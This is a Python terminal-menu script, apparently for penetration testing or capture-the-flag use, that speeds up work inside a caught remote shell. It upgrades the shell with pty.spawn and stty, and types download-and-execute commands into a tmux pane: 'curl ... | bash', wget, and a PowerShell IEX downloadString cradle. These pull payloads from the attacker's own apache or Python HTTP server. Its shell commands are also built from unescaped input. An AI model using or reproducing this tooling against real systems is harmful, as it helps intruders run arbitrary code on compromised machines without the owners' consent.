#!/usr/bin/env python3

from simple_term_menu import TerminalMenu
import os

def get_ip(iface):
    cmd = f"ip a s {iface} | grep -Eo \'[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\' | head -n 1"
    return os.popen(cmd).read().strip('\n')

def interfaces():
    cmd = 'ip l | grep -E \'^[[:digit:]]+: \' | cut -d \':\' -f 2'
    lines = os.popen(cmd).readlines()
    interfaces = list(map(lambda x: x.strip('\n '), lines))
    if 'tun0' in interfaces and not 'tun1' in interfaces:
        return 'tun0'
    print("Select interface.")
    menu = TerminalMenu(interfaces)
    index = menu.show()
    return interfaces[index]

def get_interface_ip():
    return get_ip(interfaces())

def strip_lines(lines):
    return list(map(lambda x: x.strip('\n '), lines))

def copy_to_tmux(text):
    print(text)
    cmd2 = f"echo -n {text} | tmux loadb -"
    os.system(cmd2)

def select_pane():
    cmd = "tmux list-panes | grep -v active"
    panes = list(map(lambda x: x.strip('\n '), os.popen(cmd).readlines()))
    if len(panes) == 1:
        return panes[0].split(' ')[-1]
    else:
        print("Select pane.")
        menu = TerminalMenu(panes)
        index = menu.show()
        return panes[index].split(' ')[-1]

def copy_to_pane(text):
    pane = select_pane()
    os.system(f"tmux send-keys -t {pane} '{text}'")
    
def copy_to_menu(text):
    options = ["To tmux buffer", "To tmux pane..."]
    terminal_menu = TerminalMenu(options)
    index = terminal_menu.show()
    if index == 0:
        copy_to_tmux(text)
    elif index == 1:
        copy_to_pane(text)

def stabilize_shell():
    options = ['python3', 'python']
    index = TerminalMenu(options).show()
    py = options[index]
    pane = select_pane()
    cmd = f"tmux send-keys -t {pane} {py} Space -c Space \\' 'import pty;pty.spawn(\"/bin/bash\")' \\' Enter"
    os.system(cmd)
    cmd = f"tmux send-keys -t {pane} C-z 'stty size' Enter 'stty raw -echo; fg' Enter '' Enter 'stty rows 60 cols 235' Enter 'export TERM=xterm' Enter"
    os.system(cmd)

def get_apache_file(pattern):
    print("Choose file...")
    if pattern == '':
        cmd = "ls /var/www/html"
    else:
        cmd = f"ls /var/www/html | grep '{pattern}$'"
    files = strip_lines(os.popen(cmd).readlines())
    index = TerminalMenu(files).show()
    print(files[index])
    return files[index]

def get_temp_python_file(pattern):
    ip = get_interface_ip()
    cmd = "ps -ef | grep http.server | grep -v grep"
    output = os.popen(cmd).read()
    items = list(map(lambda x: x.strip('\n'), filter(lambda x: len(x) > 0, output.split(' '))))
    print(items)
    port = items[-1]
    pid = items[1]
    if pattern == '':
        cmd = f"ls /proc/{pid}/cwd"
    else:
        cmd = f"ls /proc/{pid}/cwd | grep '{pattern}$'"
    files = strip_lines(os.popen(cmd).readlines())
    index = TerminalMenu(files).show()
    filename = files[index]
    url = f"http://{ip}:{port}/{filename}"
    return url

def is_python_http_running():
    cmd = "ps -ef | grep http.server | grep -v grep"
    output = os.popen(cmd).read()
    return len(output.strip('\n ')) > 0

def linux_menu():
    options = ["Stabilize shell", "wget a file", "curl file and pipe to bash"]
    terminal_menu = TerminalMenu(options)
    index = terminal_menu.show()
    if index == 0:
        stabilize_shell()
    elif index == 1 or index == 2:
        ip = get_interface_ip()
        if index == 1:
            file = get_apache_file('')
            cmd = f"wget {ip}/{file}"
        elif index == 2:
            file = get_apache_file('.sh')
            cmd = f"curl {ip}/{file} | bash"
        copy_to_pane(cmd)

def choose_apache_or_python():
    print("Get file from apache or temp python server?")
    index = TerminalMenu(["Apache", "Python HTTP"]).show()
    return index == 0

def windows_menu():
    useApache = True
    if is_python_http_running():
        useApache = choose_apache_or_python()
    options = ["wget outfile", "IEX download and run script"]
    index = TerminalMenu(options).show()
    if index == 0 or index == 1:
        ip = get_interface_ip()
        pane = select_pane()
        if index == 0:
            if useApache:
                file = get_apache_file('')
                url = f"{ip}/{file}"
            else:
                url = get_temp_python_file('')
                file = url.split('/')[-1]
            cmd = f"tmux send-keys -t {pane} 'wget '{url}' -outfile {file}'"
        elif index == 1:
            if useApache:
                file = get_apache_file('.ps1')
                url = f"http://{ip}/{file}"
            else:
                url = get_temp_python_file('.ps1')
            cmd = f"tmux send-keys -t {pane} 'IEX(New-Object Net.WebClient).downloadString(' \\' '{url}' \\' ')'"
        os.system(cmd)

def main():
    os.system("pwd")
    options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "Start apache"]
    terminal_menu = TerminalMenu(options)
    index = terminal_menu.show()
    if index == 0:
        copy_to_menu(get_interface_ip())
    elif index == 1:
        linux_menu()
    elif index == 2:
        windows_menu()
    elif index == 3:
        if is_python_http_running():
            copy_to_pane(get_temp_python_file(''))
        else:
            input("Start python http server and try again")
    elif index == 4:
        print("Starting apache... sudo required")
        os.system("sudo systemctl start apache2")

if __name__ == "__main__":
    main()